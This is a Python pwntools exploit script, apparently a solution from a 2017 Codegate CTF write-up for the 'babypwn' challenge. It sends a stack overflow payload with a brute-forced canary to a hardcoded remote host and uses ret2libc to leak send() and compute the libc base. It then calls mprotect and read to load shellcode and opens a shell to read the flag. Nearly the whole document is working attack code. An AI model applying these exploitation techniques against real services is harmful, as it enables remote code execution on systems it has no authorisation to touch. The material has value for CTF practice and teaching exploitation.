#https://github.com/VulnHub/ctf-writeups/blob/master/2017/codegate-prequels/babypwn.md
#!/usr/bin/env python

from pwn import *
import sys

context(os="linux", arch="i386")

# canary returned by brute.py
canary = "\x00\x19\x78\xcc"

buf_1 = "A"*40
buf_1 += canary
buf_1 += "B"*12

# -- STAGE 1 ret2libc to leak address of send() and calculate libc base address

# ret2libc
buf_2 = ""
buf_2 += p32(0x8048700)   # send@plt
buf_2 += "CCCC"
buf_2 += p32(0x4)         # sockfd
buf_2 += p32(0x0804b064)  # send@got
buf_2 += p32(0x4)         # len
buf_2 += p32(0x0)         # flags
buf_2 += "D"*200

payload = buf_1 + buf_2

r = remote("110.10.212.130", 8889)

r.recvuntil("Select menu > ")
r.sendline("2")

r.recvuntil("Input Your Message : ")
r.send(payload)

r.recvuntil("Select menu > ")

r.sendline("3")
d = r.recv()

# receive leaked address of send()
leak_send = r.recv()

print "Leaked function:"
print hexdump(leak_send)

# use http://libcdb.com/ to get libc version on server. 
# in this case it's libc-2.19_16.so. we can then get
# offsets for send(), mprotect(), and read()
offset_send = 0x000ed450
offset_mprotect = 0x000e70d0
offset_read = 0x000dabd0

# calculate libc base and addresses of mprotect() and read()
libc_base = u32(leak_send) - offset_send
print "libc base:", hex(libc_base)

addr_mprotect = libc_base + offset_mprotect
print "mprotect :", hex(addr_mprotect)

addr_read = libc_base + offset_read
print "read :", hex(addr_read)

r.close()


# -- STAGE 2 mprotect() a location to rwx and call read() to get shellcode in there --

buf_2 = ""
buf_2 += p32(addr_mprotect)
buf_2 += p32(0x08048eed)    # pop esi; pop edi; pop ebp; ret; 
buf_2 += p32(0x0804b000)    # address to mprotect()
buf_2 += p32(0x100)         # size to mprotect
buf_2 += p32(0x7)           # rwx

buf_2 += p32(addr_read)
buf_2 += p32(0x08048eed)    # pop esi; pop edi; pop ebp; ret; 
buf_2 += p32(0x4)           # sockfd
buf_2 += p32(0x0804b004)    # read shellcode in here
buf_2 += p32(0x100)         # number of bytes to read

buf_2 += p32(0x0804b004)    # return to shellcode
buf_2 += "D"*200

payload = buf_1 + buf_2

r = remote("110.10.212.130", 8889)

r.recvuntil("Select menu > ")

r.sendline("2")
r.recvuntil("Input Your Message : ")

r.send(payload)
r.recvuntil("Select menu > ")

r.sendline("3")
d = r.recv()

# read the contents of file flag 
sc = asm(shellcraft.sh())
r.send(sc)
print "Getting flag:", r.recvall()
